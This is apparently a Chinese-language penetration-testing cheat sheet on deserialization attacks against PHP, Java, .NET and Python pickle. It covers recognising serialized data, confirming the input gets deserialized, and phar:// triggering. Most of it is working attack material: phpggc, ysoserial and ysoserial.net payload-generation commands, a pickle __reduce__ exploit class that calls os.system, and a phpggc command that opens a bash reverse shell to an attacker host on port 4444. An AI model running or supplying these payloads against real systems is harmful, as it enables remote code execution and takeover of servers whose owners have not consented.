# 反序列化（PHP / .NET / pickle）

> Java 专页：`java-deserialization.md`
> **成功：** gadget 触发 OS 命令 / 写文件 / 反弹

## 反序列化

### 识别（解码后看头部特征）

```
PHP:    O:4:"User":2:{s:4:"name";...}          # O=对象
Java:   十六进制 ac ed 00 05 / base64以 rO0AB 开头
.NET:   base64以 AAEAAAD///// 开头
Python: pickle以 \x80\x04 等开头
```

### 确认可控且真的被反序列化

```
PHP:  改属性值后重发，行为变化 → 确认unserialize了你的输入
Java: 改坏几字节，500+栈里出现 readObject → 确认走了反序列化
```

### PHP（phpggc）

```
phpggc -l | grep -i laravel          # 列该框架可用链
phpggc Laravel/RCE1 system id        # 生成payload
phpggc Laravel/RCE1 system id -b     # base64输出

# 反弹shell
phpggc Laravel/RCE1 system 'bash -c "bash -i >& /dev/tcp/KALI/4444 0>&1"' -b
```

无框架时：找源码里含 `__destruct` / `__wakeup` 且能触达危险函数的类，手写对象。

### Java（ysoserial）

```
java -jar ysoserial.jar CommonsCollections5 'id' | base64
# CC5不行就依次试 CommonsCollections1-7 / CommonsBeanutils1 / Groovy1
```

### .NET（ysoserial.net）

```
ysoserial.net -g <gadget> -f Json.Net -c "cmd"
```

### Python（pickle）

```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

### phar://触发（PHP特殊场景）

文件操作函数(file_exists/is_file等)遇到 `phar://` 前缀时会反序列化phar元数据。将构造的序列化对象藏进phar文件上传。

---

